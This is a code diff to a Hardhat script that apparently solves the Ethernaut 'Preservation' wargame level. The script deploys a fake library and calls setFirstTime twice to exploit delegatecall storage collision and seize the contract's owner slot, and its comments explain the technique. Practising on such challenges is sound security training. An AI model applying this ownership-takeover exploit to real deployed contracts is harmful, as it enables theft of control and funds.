@@ -3,35 +3,26 @@ import { abi } from "../../artifacts/contracts/16.Preservation/Preservation.sol/
 import { BigNumber, Contract } from "ethers";
 import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
 import { sendEther } from "../../utils/sendEther";
-import { deployContract } from "utils/deployContract";
+import { deployContract } from "../../utils/deployContract";
+import { displayResult } from "../../utils/displayResult";
 
-function setTargetContract() {
-  const contractAddress = "0xf577488186CE532b2bC83Efc8D1470247A0Dbe1F";
-  return new Contract(contractAddress, abi);
-}
-
-async function checkSucces(attacker: SignerWithAddress, target: Contract) {
-  const owner = await target.connect(attacker).owner();
-  console.log("Success: ", owner === attacker.address);
-}
+const targetAddress = "0x793B659C6cd56102A8440a74606F0cE14F28e8f1";
 
 async function main() {
   const [attacker] = await ethers.getSigners();
-  const target = setTargetContract();
+  const target = new Contract(targetAddress, abi, attacker);
   const FakeLibrary = await deployContract("FakeLibrary");
-  let tx = await target
-    .connect(attacker)
-    .setFirstTime(BigNumber.from(FakeLibrary.address));
+  let tx = await target.setFirstTime(BigNumber.from(FakeLibrary.address));
   await tx.wait();
 
-  tx = await target
-    .connect(attacker)
-    .setFirstTime(BigNumber.from(attacker.address), {
-      gasLimit: "300000",
-    });
+  tx = await target.setFirstTime(BigNumber.from(attacker.address), {
+    gasLimit: "300000",
+  });
   await tx.wait();
 
-  checkSucces(attacker, target);
+  const owner = await target.owner();
+
+  displayResult(owner === attacker.address);
 }
 
 main().catch((error) => {
@@ -44,4 +35,4 @@ main().catch((error) => {
 // of the first storage slot of the calling contract.
 // We are going to put there the address of a library we created.
 // This library, if called in delegate call will change the value of the third
-// storage slot of calling contract, which is in our case, owner.
+// storage slot of the calling contract, which in our case is owner.
